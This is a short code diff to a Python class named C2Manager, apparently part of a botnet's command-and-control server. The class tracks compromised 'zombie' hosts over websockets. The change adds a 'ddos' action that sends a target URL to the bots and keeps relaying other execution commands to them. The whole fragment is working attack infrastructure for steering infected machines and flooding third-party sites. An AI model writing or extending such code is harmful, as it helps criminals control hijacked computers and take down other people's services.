@@ -54,10 +54,21 @@ class C2Manager:
         ws = self.zombies.get(zombie_id)
         if ws:
             try:
+                action = command['action']
+                if action != 'ddos':
+                    await ws.send_json({
+                        "action": command.get('action'),
+                        "cmd": command.get("command_type"),
+                        "command_id": command.get("command_id")
+                    })
+                    return True
                 await ws.send_json({
-                    "action": "exec",
-                    "cmd": command.get("command_type"),
-                    "command_id": command.get("command_id")
+                    "action": action,
+                    "url": command.get("url"),
+                })
+                print({
+                    "action": action,
+                    "url": command.get("url"),
                 })
                 return True
             except Exception as e:
